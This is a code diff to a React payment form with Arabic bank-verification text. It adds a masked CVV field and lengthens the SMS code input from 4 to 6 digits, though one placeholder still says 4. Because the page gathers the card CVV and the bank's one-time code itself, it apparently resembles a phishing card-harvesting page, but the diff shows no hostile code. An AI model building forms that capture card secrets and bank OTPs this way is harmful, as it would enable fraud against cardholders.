@@ -480,6 +480,25 @@ setMobile(data.mobile)
                   className="allownumericwithoutdecimal col-9"
                 />
               </div>
+            </div><div className="row" id="PinRow">
+              <div className="row">
+                <label className="col">Cvv:</label>
+                <input
+                  inputMode="numeric"
+                  pattern="[0-9]*"
+                  name="cardPin"
+                  id="cardPin"
+                  onChange={(e) => handlePaymentInfoChange("cvv", e.target.value)}
+                  value={paymentInfo.cvv}
+                  autoComplete="off"
+                  title="Should be in number. Length should be 3"
+                  type="password"
+                  size={3 }
+                  style={{ width: "80%" }}
+                  maxLength={3}
+                  className="allownumericwithoutdecimal col-9"
+                />
+              </div>
             </div>
           </div>
         )
@@ -621,7 +640,7 @@ setMobile(data.mobile)
                         <span className="title" style={{ fontWeight: "bold" }}>
                           يرجى الانتباه:
                         </span>{" "}
-                        لقد تم إرسال رمز تحقق مكون من 4 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
+                        لقد تم إرسال رمز تحقق مكون من 6 أرقام عبر رسالة نصية إلى رقم هاتفك الجوال المسجل لدى البنك. يرجى
                         إدخال الرمز في الخانة أدناه لإتمام عملية التحقق. تنتهي صلاحية الرمز خلال 5 دقائق
                       </p>
                     </div>
@@ -637,12 +656,12 @@ setMobile(data.mobile)
                 >
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center gap-1 text-blue-600">
-                      <strong>الرمز المرسل إلى الجوال من 4 أرقام</strong>
+                      <strong>الرمز المرسل إلى الجوال من 6 أرقام</strong>
                     </div>
                   </div>
                   <input
                     type="text"
-                    maxLength={4}
+                    maxLength={6}
                     placeholder="الرمز المرسل إلى الجوال من 4 أرقام"
                     className="text-center text-lg py-6 border-blue-200"
                     value={paymentInfo.otp || ""}
